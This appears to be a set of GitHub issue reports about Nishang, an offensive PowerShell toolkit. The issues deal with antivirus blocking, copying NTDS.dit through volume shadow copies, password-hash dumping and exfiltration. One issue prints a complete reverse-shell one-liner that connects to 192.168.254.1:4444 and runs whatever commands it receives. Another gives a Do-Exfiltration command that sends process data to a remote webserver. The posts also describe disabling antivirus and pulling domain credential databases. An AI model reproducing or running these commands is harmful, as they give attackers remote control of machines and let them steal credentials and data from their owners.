Im trying to import powerpreter from the file directory with Import-Module .\Powerpreter.psm1 but I get the error 



At C:\users\desktop\desktop\nishang-master\powerpreter\Powerpreter.psm1:1 char:1
+ <#
+ ~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent

Import-Module : The specified module '.\Powerpreter.psm1' was not loaded because no valid module file was found in any module directory.
At line:1 char:1
+ Import-Module .\Powerpreter.psm1
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (.\Powerpreter.psm1:String) [Import-Module], FileNotFoundException
    + FullyQualifiedErrorId : Modules_ModuleNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand




Im running as administrator and execution policy unrestricted and I have turned off AV



What can I be doing wrong?


Thanks

I noticed that when passing a path to the NTDS.dit file, using the `ntdsSource` argument, it fails when trying to copy  from the shadow. 

Take for instance the supplied example (https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1#L27):
```
Copy-VSS -DestinationDir C:\temp -ntdsSource D:\ntds\ntds.dit
                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
```

This fails with the following:

    The filename, directory name, or volume label syntax is incorrect.

This due to the script first making a copy of the C drive (https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1#L53):

    Get-WmiObject -list win32_shadowcopy).Create("C:\","ClientAccessible")

Then later, it tries to copy from the supplies `ntdsSource` (https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1#L70), which by using example above will look like this:
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[ID]\D:\ntds\ntds.dit
                                                        ^^^^^^^^^^^^^^^^
````

This fails because of two things:
 - The supplied shadow copy is of the C drive
 - The path passed to copy should not include drive letter

I guess there should be some check if the supplied `ntdsSource` is on the C drive, and if not, there needs to be taken a separate shadow copy of that. Further, the `ntdsSource` variable needs to be modified so the drive letter is removed, so that the command becomes:

    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[ID]\ntds\ntds.dit

I ended up running the commands manually, which doesn't take much effort.

Just a heads up :-)
change to  utf-8 encoding to display chinese
The "Invoke-PowerShellTcpOneLine.ps1" reverse shell prints new lines between successive lines for, e.g. the `ls` command. I'm using netcat as the listener to which the shell connects.

I've looked at the code, and I can't seem to locate the issue:

`#$client = New-Object System.Net.Sockets.TCPClient('192.168.254.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`

![kali linux-2018-06-10-11-56-26](https://user-images.githubusercontent.com/14088508/41200561-09e87e5a-6ca7-11e8-8ac0-400f55658d89.png)

How could it be fixed?

Furthermore, using commands like `net users /domain` only returns the "The request will be processed at a domain controller for domain..." intermediary response, and not the full response from the domain controller?

Get-PassHashes does not work on Windows 10 1607. It always returns empty LM/NTLM hashes on execution.
I attached a screenshot that shows the problem on a test machine. On the left side is the output from Get-PassHashes, on the right side is the (correct) output from mimikatz.
![capture](https://cloud.githubusercontent.com/assets/7213829/22934003/a592a39e-f2cd-11e6-9c06-1607f4b8cf0c.PNG)


Do-exfiltration is unable to handle the pipeline input properly. It exfiltrates only the last object returned from the command. Currently, the pipeline should not be used with Do-Exfiltration, instead, use as below:

Do-Exfiltration -Data (Get-Process) -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
